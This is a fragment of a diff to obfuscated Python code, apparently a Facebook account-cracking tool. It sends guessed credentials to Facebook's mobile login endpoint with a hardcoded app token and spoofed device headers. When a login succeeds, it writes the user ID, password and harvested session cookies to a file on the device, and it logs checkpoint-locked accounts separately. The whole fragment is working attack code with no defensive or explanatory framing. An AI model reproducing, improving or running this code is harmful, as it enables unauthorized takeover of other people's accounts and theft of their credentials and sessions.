+            O0000OOO0OO0000O0 ={'User-Agent':CEN (),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str (random .randint (2e4 ,4e4 )),'X-FB-SIM-HNI':str (random .randint (2e4 ,4e4 )),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'MOBILE.LTE','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}#line:315
+            OO00O0000OOO0O0O0 =requests .post ('https://b-graph.facebook.com/auth/login',data =O0O00O000000OO000 ,headers =O0000OOO0OO0000O0 ).json ()#line:316
+            if 'access_token'in OO00O0000OOO0O0O0 :#line:317
+                print (f'\r\r{A}[{G1}CEN-OK{A}]{G1} {OO0000OOOOOO00OOO} {A}|{G1} {O0O0OOOO00OOOO000}')#line:318
+                OO000O00OO0OO0OOO =";".join (OOOOO00000O0OO0O0 ["name"]+"="+OOOOO00000O0OO0O0 ["value"]for OOOOO00000O0OO0O0 in OO00O0000OOO0O0O0 ["session_cookies"])#line:319
+                open ('/sdcard/CEN-FILE-OK.txt','a').write (uid +'|'+O0O0OOOO00OOOO000 +'|'+OO000O00OO0OO0OOO +'\n')#line:320
+                ok .append (OO0000OOOOOO00OOO )#line:321
                 break #line:322
-            elif 'www.facebook.com'in O0OO0OO0OOOOO0O00 ['error']['message']:#line:323
-                open ('/sdcard/CEN-FILE-PODLOCK.txt','a').write (O00OOOO00OO0OO0O0 +'|'+O0000000O00OOO0OO +'\n')#line:325
+            elif 'www.facebook.com'in OO00O0000OOO0O0O0 ['error']['message']:#line:323
+                open ('/sdcard/CEN-FILE-PODLOCK.txt','a').write (OO0000OOOOOO00OOO +'|'+O0O0OOOO00OOOO000 +'\n')#line:325
             else :continue #line:326
         loop +=1 #line:327
-    except Exception as OO00OOO00O00O0O00 :#line:328
+    except Exception as OO00O0000OO000000 :#line:328
         pass #line:329
 if __name__ =='__main__':#line:330
     menu ()#line:331
